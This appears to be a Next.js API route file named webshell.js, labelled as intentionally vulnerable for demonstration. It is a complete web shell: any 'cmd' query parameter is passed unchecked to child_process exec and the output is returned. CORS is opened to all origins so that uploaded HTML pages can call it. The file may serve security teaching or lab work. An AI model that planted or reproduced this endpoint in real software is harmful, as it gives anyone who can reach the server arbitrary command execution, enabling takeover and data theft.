// pages/api/webshell.js - VULNERABLE: Command execution endpoint
// This is intentionally vulnerable for educational/demonstration purposes
// DO NOT USE IN PRODUCTION

import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export default async function handler(req, res) {
  // Set CORS headers to allow requests from uploaded HTML files
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { cmd } = req.query;

    if (!cmd) {
      return res.status(400).json({ message: 'Command parameter is required' });
    }

    
    console.warn('[!] VULNERABLE: Executing command:', cmd);
    
    // Execute the command
    const { stdout, stderr } = await execAsync(cmd, {
      maxBuffer: 1024 * 1024 * 10, // 10MB buffer
      timeout: 30000, // 30 second timeout
    });

    // Return the output
    if (stderr) {
      return res.status(200).send(stderr || stdout);
    }

    return res.status(200).send(stdout || 'Command executed (no output)');
  } catch (error) {
    console.error('[ERROR] Command execution failed:', error.message);
    
    // Return error message (don't expose full error in production)
    return res.status(500).send(`Error: ${error.message}`);
  }
}
